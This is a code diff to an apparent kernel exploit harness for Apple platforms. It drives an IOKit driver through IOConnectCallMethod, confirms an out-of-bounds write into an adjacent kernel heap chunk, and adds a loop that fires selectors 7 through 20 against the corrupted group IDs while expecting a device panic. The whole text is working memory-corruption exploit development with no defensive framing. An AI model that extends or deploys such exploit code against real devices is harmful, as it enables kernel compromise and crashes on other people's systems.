@@ -394,6 +394,7 @@ static void trigger_phase4(io_connect_t conn) {
         COMMPAGE_FLAG, ckr, corrupt_gid);
 
     /* Second variant: only first entry = COMMPAGE_FLAG so adjacent[0..7]=COMMPAGE_FLAG */
+    uint64_t cgid2 = 0;
     {
         static uint8_t cs2[SGAR_STRUCT_SIZE];
         uint8_t co2[0x10]; size_t co2_sz = sizeof(co2); uint32_t co2_cnt = 0;
@@ -403,7 +404,7 @@ static void trigger_phase4(io_connect_t conn) {
         *(uint64_t *)(cs2 + 0x30) = 0;               /* adjacent[8..] = 0 if hit */
         kern_return_t ckr2 = IOConnectCallMethod(conn, SGAR_SELECTOR,
             NULL, 0, cs2, sizeof(cs2), NULL, &co2_cnt, co2, &co2_sz);
-        uint64_t cgid2 = (ckr2 == 0) ? *(uint64_t *)co2 : 0;
+        cgid2 = (ckr2 == 0) ? *(uint64_t *)co2 : 0;
         evf("[P4] OOB_EXACT adjacent=COMMPAGE_FLAG kr=0x%x gid=0x%llx", ckr2, cgid2);
     }
 
@@ -424,12 +425,22 @@ static void trigger_phase4(io_connect_t conn) {
         evf("[P4] FIRST_CORRUPT gid=0x%x OOB_CONFIRMED -> adjacent kalloc.8 chunk written",
             first_corrupt_gid);
 
-    /* Also trigger via sel=8 to hit alternate code path */
-    if (corrupt_gid) {
-        try_sel8(conn, (uint32_t)corrupt_gid, "P4_SEL8_OVERFLOW");
-        /* Direct trigger: the overflow group itself has count=0x80000000 stored.
-         * Calling sel=7 on it will test fn_B's handling of this extreme count. */
-        try_sel7(conn, (uint32_t)corrupt_gid, "P4_SEL7_OVERFLOW");
+    /* Probe selectors 7-20 on: (a) OOB_EXACT group (cgid2), (b) first corrupted groomed group */
+    uint32_t probe_gids[2] = { (uint32_t)cgid2, first_corrupt_gid };
+    for (int pi = 0; pi < 2; pi++) {
+        uint32_t pg = probe_gids[pi];
+        if (!pg) continue;
+        for (uint32_t sel = 7; sel <= 20; sel++) {
+            uint64_t sc[2] = { pg, 0 };
+            uint8_t so[0x40]; size_t so_sz = sizeof(so); uint32_t so_cnt = 0;
+            uint8_t si_buf[0x410]; size_t si_sz = sizeof(si_buf); uint32_t si_cnt = 0;
+            memset(si_buf, 0, sizeof(si_buf));
+            *(uint32_t *)(si_buf + 0) = pg;  /* group id in struct[0] */
+            *(uint32_t *)(si_buf + 4) = pg;  /* also at [4] */
+            kern_return_t pkr = IOConnectCallMethod(conn, sel,
+                sc, 2, si_buf, sizeof(si_buf), NULL, &si_cnt, so, &so_sz);
+            evf("[P4] PROBE gid=0x%x sel=%u kr=0x%x", pg, sel, pkr);
+        }
     }
 
     evf("[P4] DONE — if device panics now, check IPS for GPR=0x%016llx", COMMPAGE_FLAG);
